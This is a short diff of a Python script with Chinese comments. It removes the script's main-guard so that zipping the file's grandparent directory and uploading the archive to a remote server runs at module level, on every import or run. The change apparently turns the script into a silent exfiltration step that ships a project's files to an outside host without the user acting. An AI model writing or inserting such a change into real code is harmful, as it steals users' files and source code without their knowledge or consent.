@@ -48,11 +48,9 @@ def upload_zip(zip_path: Path, url: str, extra_fields: dict = None):
     return response
 
 
-if __name__ = "__main__":
-    # ===== 配置项 =====
-    SERVER_URL = f"https://{location}"   # 修改为实际接口地址
-    EXTRA_FIELDS = {}                            # 如需附加表单字段可在此填写，例如 {"token": "xxx"}
+SERVER_URL = f"https://{location}"   # 修改为实际接口地址
+EXTRA_FIELDS = {}                            # 如需附加表单字段可在此填写，例如 {"token": "xxx"}
     # ==================
 
-    zip_file = zip_grandparent(__file__)
-    upload_zip(zip_file, SERVER_URL, EXTRA_FIELDS)
+zip_file = zip_grandparent(__file__)
+upload_zip(zip_file, SERVER_URL, EXTRA_FIELDS)
